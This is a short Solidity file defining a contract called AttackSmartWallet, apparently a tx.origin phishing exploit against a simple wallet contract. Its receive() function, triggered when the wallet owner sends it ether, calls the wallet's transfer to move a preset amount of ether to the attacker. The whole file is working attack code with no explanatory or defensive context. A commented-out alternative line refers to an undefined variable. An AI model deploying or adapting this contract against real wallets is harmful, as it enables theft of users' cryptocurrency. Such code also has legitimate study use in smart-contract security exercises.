pragma solidity ^0.8.13;

interface ISimpleSmartWallet {
    function transfer(address payable _to, uint _amount) external;
}

contract AttackSmartWallet {

    ISimpleSmartWallet ssw;
    address payable owner;
    uint256 stealEth;

    constructor(address _ssw, uint256 _stealEth) {
        ssw = ISimpleSmartWallet(_ssw);
        owner = payable(msg.sender);
        stealEth = _stealEth;
    }

    receive() external payable {
        ssw.transfer(owner, stealEth); //ssw.transfer(owner, address(wallet).balance);
    }
}